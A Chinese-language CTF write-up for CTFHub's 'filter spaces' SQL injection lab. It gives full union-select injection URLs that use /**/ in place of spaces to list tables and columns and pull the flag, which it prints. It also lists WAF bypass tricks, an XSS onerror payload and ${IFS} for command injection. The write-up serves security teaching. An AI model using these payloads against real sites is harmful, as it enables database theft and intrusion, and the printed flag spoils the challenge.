过滤空格 - CTFHub Web 入门 Writeup

2026年9月18日 CTFHub Web安全 SQL注入 WAF绕过

一、题目信息

  • 1.题目名称：过滤空格
  • 2.题目平台：CTFHub
  • 3.题目类型：Web / SQL注入 / WAF过滤绕过
  • 4.靶场链接：http://challenge-81404dcb3bef74cd.sandbox.ctfhub.com:10800/
  • 5.涉及工具：浏览器（地址栏传参）、Python（requests库）

二、解题步骤

1. 分析题目考什么

题目提示“过滤空格”，说明后端代码或WAF（Web应用防火墙）将SQL语句中的空格字符拦截或删除了。在SQL语法中，空格是分隔关键字（如UNION和SELECT）的必要字符。本题考察的是在空格被禁用的情况下，如何利用其他字符或语法特性来替代空格，从而成功执行SQL注入。

2. 怎么想

正常的注入语句包含空格，如 1 union select 1,2。既然空格被过滤，我们需要寻找空格的替代品。在MySQL中，注释符 /**/ 可以在语法上充当空格的作用。此外，换行符 %0a、括号 () 也是常见的替代方案。我们优先尝试使用注释符 /**/ 来构造注入语句。

3. 怎么解

第一步：测试回显位

在浏览器地址栏输入以下Payload：

http://challenge-81404dcb3bef74cd.sandbox.ctfhub.com:10800/?id=-1/**/union/**/select/**/1,2

代码逐字解析：

  • ?id=：GET请求的参数名。
  • -1：让原本的查询（id=-1）查不到数据，从而强行让页面显示我们联合查询（union select）的结果。
  • /**/：MySQL中的内联注释符。它在语法解析时会被忽略，完美替代了原本的空格，成功绕过了过滤。
  • union：联合查询关键字，用于合并两条SELECT语句的结果。
  • select：查询关键字。
  • 1,2：测试当前表有几列，以及哪一列会在页面回显。页面返回 Data: 2，说明第二个字段是回显位。

第二步：查询表名

http://challenge-81404dcb3bef74cd.sandbox.ctfhub.com:10800/?id=-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()

代码逐字解析：

  • group_concat(table_name)：把查询出来的所有表名用逗号拼成一行，因为页面一次只能显示一行数据。
  • from information_schema.tables：从MySQL自带的系统库 information_schema 的 tables 表中获取表名信息。
  • where table_schema=database()：限制条件为“当前所在的数据库”。
  • 页面回显 Data: mixefvzosd,news。记下随机表名 mixefvzosd。

第三步：查询列名

http://challenge-81404dcb3bef74cd.sandbox.ctfhub.com:10800/?id=-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='mixefvzosd'

代码逻辑同上，只是把查询目标换成了 columns 表，条件改为匹配表名 mixefvzosd。页面回显 Data: ziqimbxkii，得到列名 ziqimbxkii。

第四步：提取Flag

http://challenge-81404dcb3bef74cd.sandbox.ctfhub.com:10800/?id=-1/**/union/**/select/**/1,ziqimbxkii/**/from/**/mixefvzosd

直接查询指定表 mixefvzosd 的指定列 ziqimbxkii。页面成功弹出最终 Flag。

最终 Flag： ctfhub{24365e6cb30bf451f7e22380}

踩坑记录与改进方案：

踩坑一：在Mac终端执行URL导致报错。 初次尝试时，我将包含URL的语句直接复制到了Mac终端执行，导致报错 zsh: no matches found。原因是URL中包含的 /**/ 里的星号 * 在终端中被识别为通配符。改进方案：不要将URL直接粘贴到终端，应直接在浏览器地址栏访问，或者使用Python的requests库自动处理URL编码。

踩坑二：环境过期导致查询失败。 CTFHub环境寿命只有半小时，操作时间过长导致环境超时，页面返回404或空白。改进方案：遇到报错立刻前往网页端点击“停止并销毁环境”并重新“开启题目”，拿到新地址后重新执行查表名、查列名的步骤。

4. 怎么迁移

  • 其他SQL过滤绕过：除了空格，WAF还可能过滤 union、select、and、or 等关键字。绕过思路包括：双写（ununionion）、大小写混写（UnIoN）、内联注释（/*!union*/）。
  • 等价替换：遇到逗号被过滤，可用 join 绕过；遇到 = 被过滤，可用 like 或 in；遇到 substr 被过滤，可用 mid 或 left。遇到 and 被过滤，可用 &&。
  • Web安全其他领域：在XSS过滤绕过中，同样可以尝试用事件标签（如 <img src=x onerror=...>）绕过对 <script> 的过滤。在命令注入中，可以用 ${IFS} 或 $IFS 代替空格。

三、名词大全与原理深度复盘

1. 过滤空格：后端WAF或开发者使用黑名单机制（如正则表达式 preg_replace('/\s+/', '', $input)），将用户输入中的空格字符删除或直接拦截，试图破坏SQL语句的语法结构。

2. 内联注释符 /**/：MySQL特有的语法。在SQL解析器中，/**/ 内部的文字会被当作注释忽略，但它本身在语法上可以充当分隔符，因此可以完美替代空格来分隔SQL关键字。

3. 原理深度复盘：SQL注入的本质是“用户数据”被当作“SQL指令”执行。开发者为了防止注入，尝试过滤掉构成指令的关键字和空格。但SQL语法极其灵活，存在多种替代写法。只要解析器能够正常解析，过滤就形同虚设。这也印证了黑名单防御机制的天然缺陷：防不尽防，总有遗漏。

四、题目思考

1. 跟前面的区别：小的区别在于，之前几题（联合查询、报错注入、Cookie/UA/Refer注入）侧重于“变换注入位置”或“变换回显方式”。而这道题侧重于“特征绕过”。大类型的区别在于，从“直接利用漏洞”升级到了“对抗防御机制（WAF）”。

2. 这种题目的出现原因：开发者意识到SQL注入的危害，试图通过简单的字符过滤来阻挡攻击。但由于对SQL语法的理解不够全面，过滤规则存在缺陷（未考虑注释符和换行符的替代作用），从而产生了这种“防了但没完全防住”的漏洞。

3. 这种漏洞的应用：在真实的渗透测试中，绕过WAF是极其重要的技能。遇到防火墙拦截时，测试人员需要不断尝试各类编码、大小写、等价替换和内联注释，以判断WAF的防护规则和薄弱点。

4. 如何抽象理解概念：这是一种典型的“猫鼠游戏”。防御方试图通过切割字符来破坏攻击者的语法结构，而攻击方则利用解析器的宽容度寻找替代字符。抽象来看，只要输入过滤之后，程序仍然能将其拼成有效的执行指令，防御就会失败。核心依然是数据和指令未能彻底分离。
